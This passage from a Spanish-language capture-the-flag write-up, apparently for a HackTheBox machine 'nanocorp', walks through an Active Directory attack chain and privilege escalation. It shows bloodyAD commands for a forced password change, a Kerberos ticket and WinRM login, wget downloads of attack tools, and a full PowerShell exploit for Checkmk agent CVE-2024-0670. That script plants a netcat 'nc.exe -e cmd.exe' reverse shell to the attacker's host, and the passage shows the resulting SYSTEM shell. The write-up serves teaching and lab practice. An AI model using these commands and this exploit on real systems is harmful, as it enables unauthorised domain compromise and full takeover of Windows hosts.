* Cualquier miembro del grupo **IT_SUPPORT**, tiene el permiso **ForceChangePassword** sobre el **usuario monitoring_svc**, lo que nos permite cambiar su contraseña sin ninguna restricción.
* Por último, vemos que el **usuario monitoring_svc** puede conectarse directamente a la máquina **AD** (permiso **CanPSRemote**).

Ya tenemos una cadena de ataques que podemos seguir para ganar acceso a la máquina víctima.

### Aplicando Cadena de Ataques para Ganar Acceso a la Máquina AD {#ChainAttack}

Lo principal que debemos hacer, es agregar a nuestro **usuario web_svc** al grupo **IT_SUPPORT**.

Esto lo podemos hacer con la herramienta **bloodyAD** y aquí te explican cómo hacerlo:
* <a href="https://www.thehacker.recipes/ad/movement/dacl/addmember" target="_blank">TheHackerRecipies: AddMember</a>

Apliquémoslo:
```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u 'web_svc' -p '**********' add groupMember IT_SUPPORT web_svc
[+] web_svc added to IT_SUPPORT
```
Muy bien, se realizó el cambio.

Cambiémosle la contraseña al **usuario monitoring_svc**, que igual te explican cómo hacerlo aquí usando **bloodyAD**:
* <a href="https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword" target="_blank">TheHackerRecipies: ForceChangePassword </a>

Apliquémoslo:
```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u 'web_svc' -p '**********' set password monitoring_svc 'NewP@ssword2025!'
[+] Password changed successfully!
```
Muy bien, pudimos cambiarle la contraseña con éxito.

Por último, para poder conectarnos a la máquina **AD**, podemos crear un **TGT** y luego utilizar la herramienta **winrmexec**.

Creamos el **TGT** del **usuario monitoring_svc**:
```bash
impacket-getTGT 'nanocorp.htb'/'monitoring_svc:NewP@ssword2025!'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache
```

Lo exportamos como variable de entorno y revisamos que esté cargada:
```bash
export KRB5CCNAME=monitoring_svc.ccache

klist
Ticket cache: FILE:monitoring_svc.ccache
Default principal: monitoring_svc@NANOCORP.HTB

Valid starting     Expires            Service principal
15/11/25 08:07:55  15/11/25 12:07:55  krbtgt/NANOCORP.HTB@NANOCORP.HTB
	renew until 15/11/25 12:07:55
```

Descarga la herramienta **winrmexec** si es que no la tienes:
```bash
git clone https://github.com/ozelis/winrmexec.git
```

Utilizamos el script de **Python** y nos conectamos a la máquina víctima (recuerda que debe estar en el mismo horario que la máquina **AD**):
```batch
python3 winrmexec/winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] using domain and username from ccache: NANOCORP.HTB\monitoring_svc
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents> whoami
nanocorp\monitoring_svc
```
Estamos dentro.

En el Escritorio encontraremos la flag del usuario:
```batch
PS C:\Users\monitoring_svc\Documents> cd ../Desktop
PS C:\Users\monitoring_svc\Desktop> type user.txt
...
```

## Post Explotación {#Post}

### Aplicando Vulnerabilidad CVE-2024-0670 en check_mk_agent para Escalar Privilegios {#CMKprivesc}

Podemos cargar la herramienta **winPEASx64** para saber a qué es vulnerable la máquina.

Aquí lo puedes descargar:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Lo cargamos en la máquina usando **wget** y lo ejecutamos (recuerda que debes levantar un servidor con **Python**):
```bash
PS C:\Users\monitoring_svc\Desktop> wget “http://Tu_IP/winPEASx64.exe” -UseBasicParsing -OutFile “winPEASx64.exe”
PS C:\Users\monitoring_svc\Desktop> ./winPEASx64.exe
```

Observa lo siguiente:
```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         1112            httpd
  TCP        0.0.0.0               88            0.0.0.0               0               Listening         712             lsass
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         1012            svchost
...
  TCP        0.0.0.0               6556          0.0.0.0               0               Listening         4032            cmk-agent-ctl
...
  TCP        127.0.0.1             28250         0.0.0.0               0               Listening         3108            check_mk_agent
```
Vemos que se está utilizando la herramienta **check_mk_agent**.

Existen dos versiones vulnerables de esta herramienta, pero la que usaremos será el **CVE-2024-0670**.

| **Check_MK Agent 2.1.0p10 - CVE-2024-0670** |
|:-------------------------------------------:|
| *Este CVE permite a un atacante ejecutar comandos arbitrarios en el servidor mediante una cadena especialmente creada enviada al componente notify_by_livestatus, que forma parte de la infraestructura de notificaciones.* |

Aquí hay un blog que explica cómo aplicar la vulnerabilidad:
* <a href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/" target="_blank">Local Privilege Escalation via writable files in Checkmk Agent</a>

Utilizaremos el siguiente script de **PowerShell**, que llamaremos **bad.ps1**, que nos servirá para ejecutar comandos:
```batch
param(

    [int]$MinPID = 1000,

    [int]$MaxPID = 15000,

    [string]$LHOST = "Tu_IP",

    [string]$LPORT = "443"

)
 
# 1. Define the malicious batch payload

$NcPath = "C:\Windows\Temp\nc.exe"

$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"
 
# 2. Find the MSI trigger

$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |

        Where-Object { $_.DisplayName -like '*mk*' } |

        Select-Object -First 1).LocalPackage
 
if (!$msi) {

    Write-Error "Could not find Checkmk MSI"

    return

}
 
Write-Host "[*] Found MSI at $msi"
 
# 3. Spray the Read-Only files

Write-Host "[*] Seeding $MinPID to $MaxPID..."

foreach ($ctr in 0..1) {

    for ($num = $MinPID; $num -le $MaxPID; $num++) {

        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"

        try {

            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)

            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue

        } catch {

            # 123

        }

    }

}

Write-Host "[*] Seeding complete."
 
# 4. Launch the trigger

Write-Host "[*] Triggering MSI repair..."

Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait

Write-Host "[*] Trigger sent. Check listener."
```
Aparte de este script, ocuparemos el binario **nc.exe** y **RunasCs.exe**.

El binario **nc.exe** lo puedes encontrar en tu propio sistema, solo si usas **Kali**. Desconozco si también se encuentra en **Parrot**:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```
Solo cópialo en tu directorio de trabajo.

Para el binario **RunasCs.exe**, debemos descargar el **archivo ZIP** de su repositorio y ahí lo encontraremos:
* <a href="https://github.com/antonioCoco/RunasCs" target="_blank">Repositorio de antonioCoco: RunasCs</a>

Movámonos a la raíz y creamos un directorio temporal:
```batch
PS C:\Users\monitoring_svc\Desktop> cd C:\
PS C:\> mkdir Temp
PS C:\> cd Temp
```

Descargamos los 3 archivos que ya tenemos usando **wget**:
```batch
PS C:\Temp> wget “http://Tu_IP/RunasCs.exe” -UseBasicParsing -OutFile “RunasCs.exe”
PS C:\Temp> wget “http://Tu_IP/nc.exe" -UseBasicParsing -OutFile “nc.exe"
PS C:\Temp> wget “http://Tu_IP/bad.ps1” -UseBasicParsing -OutFile “bad.ps1”
```

Revisemos si tenemos todos los archivos:
```batch
PS C:\Temp> dir

    Directory: C:\Temp

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----        11/15/2025   6:40 AM           1417 bad.ps1                                                               
-a----        11/15/2025   6:40 AM          59392 nc.exe                                                                
-a----        11/15/2025   6:40 AM          51712 RunasCs.exe
```

Moveremos el binario **nc.exe** al directorio ``C:\Windows\Temp`:
```batch
PS C:\Temp> mv nc.exe C:\Windows\Temp
```
Ya tenemos todo listo en la máquina **AD**.

Abre un listener usando **rlwrap** en conjunto con **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Usamos **RunasCs.exe** para ejecutar nuestro script de **PowerShell**:
```batch
PS C:\Temp> .\RunasCs.exe web_svc '**********' “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Temp\bad.ps1”

[*] Found MSI at C:\Windows\Installer\1e6f2.msi
[*] Seeding 1000 to 15000...
[*] Seeding complete.
[*] Triggering MSI repair...
[*] Trigger sent. Check listener.
```
Funcionó.

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.93] 60185
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
Estamos dentro y somos el **Administrador**.

Obtengamos la última flag:
```batch
C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
...
```
Y con esto, terminamos la máquina.
